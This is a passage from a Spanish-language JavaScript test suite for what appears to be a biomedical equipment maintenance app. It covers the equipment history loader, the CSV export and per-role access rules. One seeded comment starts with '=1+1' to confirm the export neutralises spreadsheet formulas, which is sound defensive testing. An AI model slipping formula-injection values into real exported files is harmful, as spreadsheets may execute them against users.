  si(limpio.includes('lineasExp.vencidos.length > 0') && !limpio.includes('expediente.documentosVencidos'), 'la tarjeta del expediente usa los requisitos vencidos');
  for (const t of ['Proxima ejecucion', 'Alerta dias antes', 'Descripcion', 'Aun no hay planes', 'ordenes automaticamente', 'actualice la referencia', 'Qué salas depende ', 'label">Titulo']) {
    no(fuenteFicha.includes(t), `texto corregido: «${t}»`);
  }
  const hoja = await fs.readFile('src/pages/activos/[id]/hoja-vida.astro', 'utf8');
  si(hoja.includes('seccionesHojaVida(') && hoja.includes('verIncidentes'), 'la hoja de vida numera con seccionesHojaVida y no enlaza Incidentes al técnico');
  const pantalla = await fs.readFile('src/pages/activos/[id]/historial.astro', 'utf8');
  si(pantalla.includes('enlaceEvento(e.link, user.rol)') && pantalla.includes('verIncidentes'), 'el historial no enlaza Incidentes al técnico');
}

// 17. Cargador y CSV contra las migraciones reales (incluida la 0059): nombres de
// columnas, uniones por activo_id, límite de 100 columnas de D1 y roles.
const h = await setupConjuntos({ modules: { historialApi: 'pages/api/activos/[id]/historial', cargador: 'lib/historial-equipo-db', db: 'lib/db' } });
try {
  const db = h.sqlite;
  h.faults.enforceColumnLimit = true;
  db.exec(`
    INSERT INTO sucursales(id,nombre) VALUES(1,'Sede Uno');
    INSERT INTO ubicaciones(id,sucursal_id,nombre,tipo) VALUES(1,1,'UCI','area');
    INSERT INTO activos(id,codigo,nombre,tipo,rubro,ubicacion_id,es_patron) VALUES(1,'BIO-001','Monitor de signos','biomedico','biomedico',1,0);
    INSERT INTO activos(id,codigo,nombre,tipo,rubro,serial,es_patron,requiere_calibracion) VALUES(2,'PAT-001','Simulador de paciente','biomedico','biomedico','SP-9',1,1);
    INSERT INTO activos(id,codigo,nombre,tipo,rubro) VALUES(3,'BIO-003','Otro equipo','biomedico','biomedico');
    INSERT INTO proveedores(id,nombre,es_laboratorio_acreditado,acreditacion_organo,acreditacion_vigencia) VALUES(1,'Metrología SA',1,'OSA','2027-01-31');
    INSERT INTO items(id,codigo,nombre,unidad) VALUES(1,'REP-01','Fusible 10 A','unidad');
    INSERT INTO ordenes(id,titulo,tipo,estado,activo_id,asignado_a,creado_por,created_at,completada_en,cerrado_en,verificado_por,trabajos_realizados,causa_raiz,solucion_aplicada)
      VALUES(10,'No enciende','correctivo','cerrada',1,3,2,'2026-05-11 01:30:00','2026-05-12 15:00:00','2026-05-13 15:00:00',2,'Cambio de fusible','Sobrecarga','Fusible nuevo');
    INSERT INTO ordenes(id,titulo,tipo,estado,activo_id,creado_por,created_at) VALUES(11,'Otro equipo','preventivo','abierta',3,2,'2026-05-11 12:00:00');
    INSERT INTO orden_verificacion(orden_id,version,ciclo,ejecutado_por,executores_json) VALUES(10,1,1,3,'[3,4]');
    INSERT INTO orden_incidentes(orden_id,numero_reporte,fecha_notificacion,marcado_por) VALUES(10,NULL,'2026-05-12',1);
    INSERT INTO comentarios(orden_id,usuario_id,texto,created_at) VALUES(10,3,'=1+1 pidió el repuesto','2026-05-11 16:00:00');
    INSERT INTO comentarios(orden_id,usuario_id,texto,created_at) VALUES(11,3,'De otro equipo','2026-05-11 16:00:00');
    INSERT INTO orden_repuestos(orden_id,item_id,cantidad,precio_unitario,registrado_por,created_at) VALUES(10,1,2,1.5,3,'2026-05-12 14:00:00');
    INSERT INTO calibraciones(id,activo_id,fecha_calibracion,proxima_calibracion,certificado_r2_key,resultado,usuario_id) VALUES(20,2,'2025-12-01','2026-12-01','k/p.pdf','conforme',1);
    INSERT INTO calibraciones(id,activo_id,fecha_calibracion,proxima_calibracion,laboratorio_id,lab_acreditado,lab_acreditacion_ref,numero_certificado,patron_activo_id,resultado,incertidumbre,usuario_id)
      VALUES(21,1,'2026-05-10','2027-05-10',1,1,'OSA · N.º LC-1 · vigente hasta 31/01/2027','C-77',2,'conforme_con_ajuste','±1 %',1);
    INSERT INTO activo_documentos(id,activo_id,nombre,content_type,tamano,r2_key,categoria,usuario_id,fecha_vencimiento,created_at) VALUES(30,1,'manual.pdf','application/pdf',2048,'k/m.pdf','manual_operacion',2,'2027-01-01','2026-04-01 12:00:00');
    INSERT INTO alertas_equipo(id,tipo,fuente,titulo,fecha_alerta,estado,accion_tomada,fecha_cierre,aplicabilidad) VALUES(40,'retiro','fabricante','Retiro de baterías','2026-03-01','cerrada','Baterías cambiadas','2026-03-10','aplica');
    INSERT INTO alertas_equipo_activos(alerta_id,activo_id) VALUES(40,1);
    INSERT INTO capacitaciones(id,fecha,tema,instructor_nombre,usuario_id) VALUES(50,'2026-02-01','Uso del monitor','Ana',2);
    INSERT INTO capacitacion_equipos(capacitacion_id,activo_id) VALUES(50,1);
    INSERT INTO capacitacion_asistentes(capacitacion_id,orden,nombre) VALUES(50,1,'Enfermera 1'),(50,2,'Enfermera 2');
    INSERT INTO capacitacion_archivos(capacitacion_id,nombre,content_type,tamano,r2_key,categoria,usuario_id) VALUES(50,'lista.pdf','application/pdf',10,'k/l.pdf','lista_firmada',2);
    INSERT INTO capacitaciones(id,fecha,tema,instructor_nombre,usuario_id) VALUES(51,'2099-01-15','Revisión anual de uso','Ana',2);
    INSERT INTO capacitacion_equipos(capacitacion_id,activo_id) VALUES(51,1);
    INSERT INTO pruebas_seguridad_electrica(id,activo_id,fecha,tipo,clase_proteccion,inspeccion_visual,prueba_funcional,resultado_calculado,resultado,analizador_descripcion,analizador_serie,analizador_cal_vence,realizado_por,proxima_fecha,registrado_por)
      VALUES(60,1,'2026-01-15','periodica','I','conforme','conforme','pasa','pasa','Fluke ESA615','F1','2026-12-01','Pedro','2027-01-15',3);
    INSERT INTO activo_bajas(id,activo_id,estado,fecha_baja,motivo,motivo_detalle,evaluacion_tecnica,evaluado_por,autoriza_nombre,autoriza_cargo,destino_final,residuos_baterias,estado_anterior,registrado_por,registrado_por_nombre,revertida_en,revertida_por_nombre,reversion_motivo)
      VALUES(70,1,'revertida','2026-06-01','obsolescencia','Sin repuestos','No reparable','Ing.','Director','Dirección','descarte','No aplica','operativo',1,'Prueba admin','2026-06-02 15:00:00','Prueba admin','Se registró por error');
    INSERT INTO audit_log(entidad,entidad_id,accion,usuario_id,cambios,resumen,created_at) VALUES('activo',1,'update',1,'{"claseRiesgo":{"antes":null,"despues":"IIb"}}','Modificó Clase de riesgo','2026-01-01 15:00:00');
    INSERT INTO audit_log(entidad,entidad_id,accion,usuario_id,resumen) VALUES('activo',3,'update',1,'De otro equipo');
  `);
  const ctx = h.ctx('/x');
  const carga = await h.app.cargador.cargarHistorialEquipo(h.app.db.getDb(ctx), 1);
  es(carga.ots.map((o) => [o.codigo, o.ejecutores, o.verificador, o.incidente?.fechaNotificacion]), [['OT-MB0001', ['Prueba tecnico', 'Prueba visualizador'], 'Prueba jefe', '2026-05-12']], 'la OT con su código, ejecutores, verificador e incidente');
  es(carga.comentarios.length, 1, 'solo los comentarios de este equipo');
  es(carga.repuestos.map((r) => [r.codigo, r.cantidad, r.registradoPor]), [['REP-01', 2, 'Prueba tecnico']], 'repuestos por JOIN');
  const cal = carga.calibraciones[0];
  es([cal.laboratorio, cal.labAcreditado, cal.patron?.codigo, cal.patronVigente, cal.patronHasta], ['Metrología SA', true, 'PAT-001', true, '2026-12-01'], 'calibración con laboratorio y patrón vigente en su fecha');
  const capHecha = carga.capacitaciones.find((c) => c.id === 50);
  es([capHecha.asistentes, capHecha.listaFirmada], [2, true], 'capacitación con asistentes y lista firmada');
  es(carga.pruebasSE[0].tieneInforme, false, 'prueba sin informe');
  es(carga.bajas[0].reversionMotivo, 'Se registró por error', 'baja revertida');
  es(carga.bitacora.map((b) => b.cambios), [[{ campo: 'claseRiesgo', etiqueta: 'claseRiesgo', antes: '(vacío)', despues: 'IIb' }]], 'solo la bitácora de este equipo');
  es(carga.alertas[0].aplicabilidad, 'aplica', 'aplicabilidad por alerta');

  const csv = await h.call(h.app.historialApi.GET, '/api/activos/1/historial', { id: 1, rol: 'visualizador' });
  es(csv.status, 200, 'el visualizador descarga el CSV');
  const lineas = csv.body.replace(/^﻿/, '').split('\r\n');
  es(lineas[0], 'Fecha,Hora,Evento,Orden,Descripción,Detalle,Responsable,Resultado o estado,Incidente (reporte de Calidad),Código del equipo', 'encabezados del CSV');
  si(lineas.some((l) => l.startsWith('2026-05-10,19:30,Orden creada,OT-MB0001,OT-MB0001: No enciende,')), 'OT creada a las 19:30 del 10 en SV');
  si(lineas.some((l) => l.startsWith('2026-05-10,,Calibración,,Calibración: Conforme con ajuste,') && l.includes('Próxima: 2027-05-10')), 'calibración con fechas AAAA-MM-DD');
  si(lineas.some((l) => l.includes(",'=1+1 pidió el repuesto,")), 'un comentario que empieza con = no es fórmula');
  si(lineas.filter((l) => l.includes(',OT-MB0001,')).every((l) => l.includes(',pendiente (2026-05-12),BIO-001')), 'columna de incidente en las filas de la orden');
  si(lineas.some((l) => l.includes('Baja revertida')), 'la reversión de la baja');
  no(csv.body.includes('De otro equipo'), 'nada de otro equipo');
  si(lineas.some((l) => l.startsWith('2099-01-15,,Capacitación,,Capacitación programada: Revisión anual de uso,') && l.includes(',Programada,')), 'una capacitación futura sale como programada');
  es(lineas.length - 1, 16, 'dieciséis eventos');
  const periodo = await h.call(h.app.historialApi.GET, '/api/activos/1/historial?desde=2026-05-10&hasta=2026-05-10', { id: 1, rol: 'tecnico' });
  es(periodo.body.split('\r\n').slice(1).map((l) => l.split(',')[2]), ['Orden creada', 'Calibración'], 'filtro de período por el día de SV');
  es(await h.call(h.app.historialApi.GET, '/api/activos/1/historial', { id: 1, rol: 'solicitante' }), { status: 403, body: { error: 'Tu usuario no puede ver el historial de los equipos.' } }, 'solicitante: 403');
  es((await h.call(h.app.historialApi.GET, '/api/activos/1/historial', { id: 1, rol: 'motorista' })).status, 403, 'motorista: 403');
  es((await h.call(h.app.historialApi.GET, '/api/activos/1/historial', { id: 1, rol: null })).status, 401, 'sin sesión: 401');
  es(await h.call(h.app.historialApi.GET, '/api/activos/1/historial?desde=2026-05-10&hasta=2026-05-01', { id: 1 }), { status: 400, body: { error: 'La fecha «Desde» es posterior a «Hasta».' } }, 'período al revés');
  es(await h.call(h.app.historialApi.GET, '/api/activos/x/historial', { id: 'x' }), { status: 400, body: { error: 'Equipo no válido.' } }, 'id no válido');
  es(await h.call(h.app.historialApi.GET, '/api/activos/999/historial', { id: 999 }), { status: 404, body: { error: 'Equipo no encontrado.' } }, 'equipo inexistente');
  no(h.queries.some((q) => / in \(\?, \?/i.test(q.sql)), 'ninguna lista de ids como parámetros');
  si(Math.max(...h.queries.map((q) => q.columns.length)) <= 100, 'ninguna consulta pasa de 100 columnas');
} finally {
  await h.close();
}

console.log(`PASS test-bio-historial: ${n} casos`);
